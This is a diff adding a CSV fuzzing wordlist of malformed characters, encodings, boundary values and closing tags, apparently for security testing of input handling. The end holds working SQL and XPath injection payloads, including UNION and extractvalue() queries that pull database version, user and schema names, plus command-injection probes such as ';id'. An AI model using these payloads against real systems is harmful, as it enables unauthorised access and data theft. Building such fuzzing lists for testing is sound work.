@@ -1,0 +1,180 @@
+Type,Pattern
+Deforming,-
+Deforming,+
+Deforming,$
+Deforming,%
+Deforming,'
+"Deforming,&apos;"
+"Deforming,"""
+"Deforming,&quot;"
+Deforming,<
+"Deforming,&lt;"
+Deforming,%3C
+Deforming,>
+"Deforming,&gt;"
+Deforming,<![
+Deforming,]>
+Deforming,<!--
+Deforming,-->
+Deforming,#
+Deforming,}
+Deforming,<[{
+Deforming,\
+Deforming,%5C
+Deforming,%5C/
+Deforming,\\
+Deforming,\\/
+Deforming,\\\\*
+Deforming,\\\\?\\
+Deforming,|
+Deforming,%7C
+Deforming,`
+Deforming,%60
+Deforming,--
+Deforming,*|
+Deforming,^'
+Deforming,\'
+Deforming,/'
+Deforming,@'
+Deforming,(')
+Deforming,{'}
+Deforming,[']
+Deforming,*'
+Deforming,#'
+Deforming,!'
+Deforming,\t
+"Deforming,""\t"""
+Deforming,\n
+"Deforming,""\n"""
+Deforming,%0a
+"Deforming,&#10;"
+"Deforming,&#13;"
+"Deforming,&#10;&#13;"
+"Deforming,&#13;&#10;"
+Deforming,#xD
+Deforming,#xA
+Deforming,#xD#xA
+Deforming,#xA#xD
+Deforming,%20
+Deforming,%20|
+Deforming,*
+Deforming,%2A
+Deforming,/%2A
+Deforming,*/*
+Deforming,/
+Deforming,//
+Deforming,//*
+Deforming,:
+"Deforming,;"
+Deforming,,
+Deforming,%2C
+Deforming,@
+Deforming,@*
+"Deforming,&apos;XoiZR"
+"Deforming,&lt;% Tnn96 %&gt;"
+"Deforming,&lt;%= Tnn96 %&gt;"
+"Deforming,&lt;? Tnn96 ?&gt;"
+"Deforming,&lt;?Tnn96 ?&gt;"
+"Deforming,&lt;Tnn96&gt;"
+"Deforming,&quot;XoiZR"
+Deforming,(Tnn96)
+Deforming,[Tnn96]
+Deforming,{{= Tnn96}}
+Deforming,{{Tnn96}}
+Deforming,{= Tnn96}
+Deforming,{Tnn96}
+"Deforming,/&apos;"
+"Deforming,\&apos;"
+"Deforming,^&apos;"
+"Deforming,@&apos;"
+"Deforming,{&apos;}"
+"Deforming,[&apos;]"
+"Deforming,*&apos;"
+"Deforming,#&apos;"
+"Deforming,&quot;;id&quot;"
+Deforming,id%00
+Deforming,id%00|
+Deforming,%250a
+Deforming,%2500
+Special Values,A
+Special Values,0
+Special Values,00
+Special Values,\0
+Special Values,\00
+Special Values,\0\0
+Special Values,\0\0\0
+Special Values,\00
+Special Values,\00\00
+Special Values,\00\00\00
+Special Values,0.00005
+Special Values,0.1
+Special Values,0.9
+Special Values,-1.0
+Special Values,1
+Special Values,-1
+Special Values,2
+Special Values,-2
+Special Values,-20
+Special Values,1.7976931348623157e+308
+Special Values,5e-10
+Special Values,5e-324
+Special Values,268435455
+Special Values,65536
+Special Values,-268435455
+Special Values,2147483647
+Special Values,0xfffffff
+Special Values,false
+Special Values,FALSE
+Special Values,true
+Special Values,TRUE
+Special Values,null
+Special Values,NULL
+Special Values,%00
+Special Values,+%00
+Special Values,/%00/
+Special Values,%00/
+Nested SQL,' or ''='
+Nested SQL,' or '1'='1
+Nested SQL,x' or 1=1 or 'x'='y
+Nested SQL,x' or name()='username' or 'x'='y
+Random Closing Tags,na</test>me
+Random Closing Tags,</test>
+Random Closing Tags,'</test>
+Random Closing Tags,2</test>.0
+Random Closing Tags,</test></test>
+Random Closing Tags,</test>test
+Random Closing Tags,</test>3
+Random Closing Tags,</test>0
+Random Closing Tags,true</test>
+Random Closing Tags,</test>true
+Random Closing Tags,false</test>
+Random Closing Tags,</test>false
+Nested XPath,1/0
+Nested XPath,' or '1'='1
+Nested XPath,' or ''='
+Nested XPath,x' or 1=1 or 'x'='y
+Nested XPath,lol' or 1=1 or 'a'='a
+Nested XPath,'%20o/**/r%201/0%20--
+Nested XPath,' o/**/r 1/0 --
+Nested XPath,;
+Nested XPath,'%20and%201=2%20--
+Nested XPath,' and 1=2 --
+Nested XPath,/
+Nested XPath,//
+Nested XPath,//*
+Nested XPath,*/*
+Nested XPath,@*
+Nested XPath,count(/child::node())
+Nested XPath,x' or name()='username' or 'x'='y
+Nested XPath,' and count(/*)=1 and '1'='1
+Nested XPath,' and count(/@*)=1 and '1'='1
+Nested XPath,' and count(/comment())=1 and '1'='1
+Nested XPath, or name(//users/LoginID[1]) = 'LoginID' or 'a'='b
+Nested XPath,test�%20UNION%20select%201,%20@@version,%201,%201;�
+Nested XPath,test� UNION select 1, @@version, 1, 1;�
+Nested XPath,  and extractvalue(rand(),concat(version()))—
+Nested XPath,  and extractvalue(rand(),concat(user()))—
+Nested XPath,  and extractvalue(rand(),concat(database()))—
+Nested XPath,  and extractvalue(rand(),concat(0x3a,(select concat(0x3a,table_name) from information_schema.tables limit N,1)))--
+Nested XPath,  and extractvalue(rand(),concat(0x3a,(select concat(0x3a,column_name) from information_schema.columns limit N,1)))--
+Nested XPath,  and extractvalue(rand(),concat(0x3a,(select concat(0x3a,ColumnName1,0x3a,ColumnName2,0x3a,ColumnName3) from TableName)))--
